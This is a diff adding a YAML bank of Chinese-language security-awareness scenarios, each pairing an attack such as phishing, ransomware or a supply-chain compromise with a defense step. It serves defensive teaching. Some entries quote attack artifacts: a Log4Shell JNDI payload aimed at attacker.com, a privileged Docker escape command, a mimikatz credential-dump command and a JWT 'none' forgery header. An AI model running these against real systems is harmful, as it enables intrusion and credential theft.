@@ -1,0 +1,171 @@
+# Topic bank for hacker_pov archetype (replaces ctf — Sunday)
+# Each entry is a real-world security scenario told in second-person present tense.
+# The reader "experiences" the scenario and learns the lesson through immersion.
+#
+# Fields:
+#   pov_type:        Who the reader is (安全分析师/IT管理员/普通用户/开发者)
+#   attack_type:     What kind of attack/threat this is
+#   scenario:        The scene context (time, place, what you're doing)
+#   technical_detail: The specific artifact shown on the card (log line, domain, path)
+#   defense_action:  One concrete thing the reader can do right now
+
+topics:
+  - slug: dns-typosquatting-beacon
+    problem: SIEM告警发现可疑DNS请求指向typosquatted域名
+    pov_type: 安全分析师
+    attack_type: DNS C2信标 / Typosquatting
+    scenario: 周五下午5点，你正在关电脑，SIEM弹出一条告警——内网某台机器每30秒发一次DNS请求
+    technical_detail: "update.microsofft.com (注意：多了一个f)"
+    defense_action: 立即隔离该机器，检查它的进程列表（Windows用Task Manager → 详细信息，Linux用 ps aux | grep -v grep），搜索有没有不认识的进程名
+
+  - slug: ssh-brute-force-detected
+    problem: 服务器日志里出现大量SSH失败登录
+    pov_type: IT管理员
+    attack_type: SSH暴力破解攻击
+    scenario: 周一早上9点刚到公司，打开Slack，运维群里有条消息：服务器昨晚有点奇怪
+    technical_detail: "Failed password for root from 185.220.101.47 port 52341 (×847 times)"
+    defense_action: 执行 sudo fail2ban-client status sshd 查看封禁情况；如果没装fail2ban，现在装——它能自动封禁暴力破解的IP
+
+  - slug: phishing-email-redirect
+    problem: 收到看起来正常的"公司通知"邮件，链接跳到了奇怪的域名
+    pov_type: 普通用户
+    attack_type: 鱼叉式网络钓鱼（Spear Phishing）
+    scenario: 周三下午，你在处理邮件，收到一封发件人是"IT支持部"的通知，说要重置密码
+    technical_detail: "链接跳转到：hr-portal.company-secure-login.net（不是公司官方域名）"
+    defense_action: 悬停在链接上（不要点）看实际URL；遇到任何催你"立刻登录"的邮件，直接打开浏览器手动输公司网址——不要点邮件里的链接
+
+  - slug: supply-chain-npm-package
+    problem: npm包的新版本里藏了恶意代码
+    pov_type: 开发者
+    attack_type: 软件供应链攻击
+    scenario: 周二早上，你 npm install 更新了依赖，CI/CD 突然报了一个奇怪的权限错误
+    technical_detail: "node_modules/colors/lib/colors.js → process.env 异常读取 + 网络外连"
+    defense_action: 执行 npm audit 检查已知漏洞；用 npm ls --depth=0 确认直接依赖版本；关键项目把 package-lock.json 提交到 git，锁定版本
+
+  - slug: credential-stuffing-login-spike
+    problem: 用户账号登录失败量突然飙升
+    pov_type: 安全分析师
+    attack_type: 撞库攻击（Credential Stuffing）
+    scenario: 黑色星期五凌晨2点，监控大屏亮起告警：登录接口每分钟失败次数从正常的20次暴增到3000次
+    technical_detail: "登录失败率：94.7% | 来源IP分散至47个国家 | User-Agent全部相同"
+    defense_action: 立即启用登录频率限制（Rate Limiting）；检查你的账号是否在 haveibeenpwned.com 上出现；所有账号开启二次验证（2FA）
+
+  - slug: insider-threat-data-exfil
+    problem: 离职员工在最后一天大量下载了公司文件
+    pov_type: IT管理员
+    attack_type: 内部威胁 / 数据泄露
+    scenario: 周四下午，你在审查DLP（数据防泄露）日志，发现一个账号在今天上午有异常行为
+    technical_detail: "user: j.chen@company.com | 09:14-11:32 | 下载 847 个文件 | 目标：USB设备"
+    defense_action: 检查员工离职前权限是否已收回；部署DLP规则：检测到批量下载时自动告警；HR通知后IT应在24小时内禁用账号
+
+  - slug: ransomware-smb-lateral
+    problem: 勒索软件通过内网SMB共享横向扩散
+    pov_type: IT管理员
+    attack_type: 勒索软件横向移动
+    scenario: 周二上午10点，你的电话开始轰炸，每隔30秒就有一个用户说"我的文件打不开了"
+    technical_detail: "C:\\Users\\Public\\Documents\\Q3_Report.xlsx.LOCKED | 内网扫描 \\\\192.168.1.* port 445"
+    defense_action: 立即断开受感染机器的网线（不要关机）；阻断内网445端口通信；联系你们的事件响应团队——时间就是数据
+
+  - slug: api-key-github-exposed
+    problem: 开发者把API密钥提交到了GitHub公开仓库
+    pov_type: 开发者
+    attack_type: 凭证泄露 / 密钥暴露
+    scenario: 周三下午，你收到AWS发来的账单告警邮件，本月费用已经超出预算$47,000
+    technical_detail: "GitHub commit: +AKIAIOSFODNN7EXAMPLE（AWS Access Key ID 明文提交）"
+    defense_action: 立刻在AWS控制台撤销该密钥；用 git-secrets 或 trufflehog 扫描历史提交；把密钥放环境变量（.env）而不是代码里，.env 加入 .gitignore
+
+  - slug: rogue-wifi-evil-twin
+    problem: 咖啡馆里有人架了一个跟星巴克同名的假WiFi热点
+    pov_type: 普通用户
+    attack_type: 中间人攻击 / Evil Twin热点
+    scenario: 你在咖啡馆打开WiFi，看到两个名字一样的"Starbucks"热点，你选了信号强的那个
+    technical_detail: "连接的SSID：Starbucks | BSSID：DE:AD:BE:EF:CA:FE（非官方AP）"
+    defense_action: 公共WiFi只做不需要登录的事；只要输账号密码，一定要开VPN；区分真假热点：看BSSID（MAC地址）——同一地点两个同名热点，有一个是假的
+
+  - slug: log4shell-scan-traffic
+    problem: 服务器日志里出现大量Log4Shell漏洞探测请求
+    pov_type: 安全分析师
+    attack_type: 漏洞利用扫描（Log4Shell / CVE-2021-44228）
+    scenario: 2021年12月，你在看Web服务器的访问日志，注意到User-Agent字段里有奇怪的字符串
+    technical_detail: "${jndi:ldap://attacker.com:1389/a} (User-Agent字段中的JNDI注入尝试)"
+    defense_action: 更新Log4j到2.17.1+；用WAF规则过滤包含${jndi:的请求；用工具扫描内网受影响的服务
+
+  - slug: social-engineering-helpdesk
+    problem: 攻击者冒充员工给IT帮助台打电话，成功重置了密码
+    pov_type: IT管理员
+    attack_type: 社会工程学攻击（Vishing）
+    scenario: 你的帮助台同事今天收到一个电话，说是市场部的张经理，手机丢了，需要紧急重置OA密码
+    technical_detail: "来电号码：+86-021-XXXXXX（外部号码，非公司内网） | 来电者无法提供员工编号"
+    defense_action: 建立密码重置验证流程：必须验证工号+部门经理邮件确认；电话里永远不重置密码；所有敏感操作要有书面（邮件）授权记录
+
+  - slug: container-escape-docker
+    problem: 容器中运行的代码通过挂载宿主机目录实现了逃逸
+    pov_type: 开发者
+    attack_type: 容器逃逸（Docker privilege escalation）
+    scenario: 你在排查一个奇怪的bug，服务器上的Docker容器里突然多了一些不属于你的文件
+    technical_detail: "docker run --privileged -v /:/mnt alpine chroot /mnt (宿主机根目录被挂载)"
+    defense_action: 永远不要用 --privileged 运行容器；检查 docker inspect 里有无 HostConfig.Privileged:true；生产环境用只读挂载 :ro
+
+  - slug: phishing-qr-code
+    problem: 公司会议室里有人换了投影仪上的二维码，指向钓鱼页面
+    pov_type: 普通用户
+    attack_type: 二维码钓鱼（QRishing）
+    scenario: 公司茶水间有一张"WiFi密码"的二维码，旁边的同事扫了以后手机跳出来一个登录页面
+    technical_detail: "扫码跳转：http://company-wifi-login.net/auth（不是公司内网地址）"
+    defense_action: 扫二维码前先看看贴纸有没有被覆盖过（可以摸一摸）；使用手机扫码时先在预览URL里确认域名；网络登录页面只在官方域名上填密码
+
+  - slug: zero-day-edge-exploit
+    problem: 攻击者用零日漏洞攻击了还没打补丁的浏览器
+    pov_type: 普通用户
+    attack_type: 零日漏洞利用（Browser Exploit）
+    scenario: 你在公司电脑上点开了一个同事发来的"行业报告"PDF链接，浏览器突然卡了5秒，然后恢复正常
+    technical_detail: "HTTP响应头：Content-Type: application/pdf | 实际内容：混淆的JavaScript shellcode"
+    defense_action: 浏览器设置自动更新（设置→关于，检查有无更新）；公司电脑不要用个人邮件收附件；启用浏览器沙盒模式（Chrome默认开启，别关）
+
+  - slug: jwt-none-algorithm
+    problem: 开发者误用了JWT的none算法，任何人都能伪造token
+    pov_type: 开发者
+    attack_type: JWT算法混淆漏洞
+    scenario: 安全审计报告出来了，你的API被标了一个高危——你只用了3秒就复现了这个漏洞
+    technical_detail: "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"} → 任意用户ID均可伪造成admin"
+    defense_action: 后端验证时显式指定允许的算法（不接受none）；用 jwt.io 检查你现有的token header；更换到RS256（非对称加密）而不是HS256
+
+  - slug: s3-bucket-public
+    problem: 公司S3存储桶被设置为公开可读，内含客户数据
+    pov_type: 安全分析师
+    attack_type: 云配置错误 / 数据暴露
+    scenario: 你在做季度安全巡检，用自动化工具扫了一遍AWS资源，结果让你手抖了一下
+    technical_detail: "s3://company-customer-data-backup → ACL: public-read | 包含 12,847 条记录"
+    defense_action: 立即在AWS控制台把Bucket ACL改为private；开启S3 Block Public Access（账号级别）；用AWS Config规则自动检测公开存储桶
+
+  - slug: malicious-chrome-extension
+    problem: 浏览器扩展程序在后台读取了所有标签页的内容和Cookie
+    pov_type: 普通用户
+    attack_type: 恶意浏览器扩展程序
+    scenario: 你一直在用一个"免费PDF转换"插件，今天无意中看到它的权限列表
+    technical_detail: "扩展权限：tabs, storage, <all_urls>, webRequest, cookies（读取所有网页+Cookie）"
+    defense_action: 打开 chrome://extensions 检查每个扩展的权限；删掉所有"功能和权限不匹配"的扩展；只安装官方来源、有大量评价的扩展
+
+  - slug: default-iot-credentials
+    problem: 路由器还在用出厂默认密码，被扫描器发现并植入后门
+    pov_type: IT管理员
+    attack_type: 默认凭证利用 / IoT设备入侵
+    scenario: 下午做例行设备巡检，你登上了办公室角落那台3年前装的网络摄像头——用的还是admin/admin
+    technical_detail: "设备型号：Hikvision DS-2CD2T47G2 | 登录：admin/12345 | 固件版本：2019-03"
+    defense_action: 立即修改所有网络设备的默认密码；更新固件到最新版本；把IoT设备隔离到单独的VLAN，不能直接访问核心内网
+
+  - slug: timing-attack-login
+    problem: 登录接口的响应时间泄露了用户名是否存在
+    pov_type: 开发者
+    attack_type: 时序攻击（Timing Attack）
+    scenario: 你在做渗透测试，测试登录接口——你注意到一个奇怪的规律：某些用户名的响应特别慢
+    technical_detail: "存在的用户名响应：847ms | 不存在的用户名响应：12ms（差了70倍）"
+    defense_action: 用户名/密码验证时，无论结果如何都要执行相同时长的操作（对所有情况都做哈希比对）；登录失败统一返回"用户名或密码错误"，不要区分哪个错了
+
+  - slug: memory-dump-credentials
+    problem: Windows系统内存里存着明文凭证，工具一秒就能提取
+    pov_type: 安全分析师
+    attack_type: 内存凭证提取（LSASS Dump）
+    scenario: 红队演练第二天，你拿到了一台普通员工的Windows机器权限，想看看能横向移动到哪里去
+    technical_detail: "mimikatz # sekurlsa::logonpasswords → [00000003] Primary: admin@domain / P@ssw0rd123!"
+    defense_action: 开启Windows Credential Guard（企业版）；开启受保护的LSASS进程（RunAsPPL=1）；实施最小权限原则：普通员工账号不要有域管权限
